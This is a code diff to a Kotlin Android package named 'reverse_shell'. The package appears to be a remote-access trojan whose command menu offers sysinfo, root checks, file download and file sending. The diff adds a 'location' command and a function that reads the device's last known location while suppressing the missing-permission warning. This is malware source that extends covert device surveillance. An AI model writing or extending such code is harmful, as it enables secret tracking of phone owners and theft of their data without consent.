@@ -1,7 +1,13 @@
 package com.satwik.nexgenius.core.reverse_shell
 
+import android.annotation.SuppressLint
 import android.content.Context
 import android.net.Uri
+import com.google.android.gms.location.LocationServices
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.async
+import kotlinx.coroutines.tasks.await
+import kotlinx.coroutines.withContext
 import java.io.File
 import java.io.FileInputStream
 import java.io.OutputStream
@@ -57,6 +63,8 @@ fun help():String{
         sysinfo - get system information
         checkroot - check if device is rooted
         download - download file from url
+        location - get device current location
+        
     """.trimIndent()
 }
 
@@ -103,5 +111,16 @@ fun sendFile(path: String, dataOutputStream: OutputStream): String {
     return "File Sent"
 }
 
+@SuppressLint("MissingPermission")
+suspend fun getCurrentLocation(context: Context): Location {
+    val fusedLocationClient = LocationServices.getFusedLocationProviderClient(context)
 
+    val lastLocation = fusedLocationClient.lastLocation.await()
+
+    lastLocation.let {
+        val latitude = it.latitude
+        val longitude = it.longitude
+        return Location(latitude, longitude)
+    }
+}
 
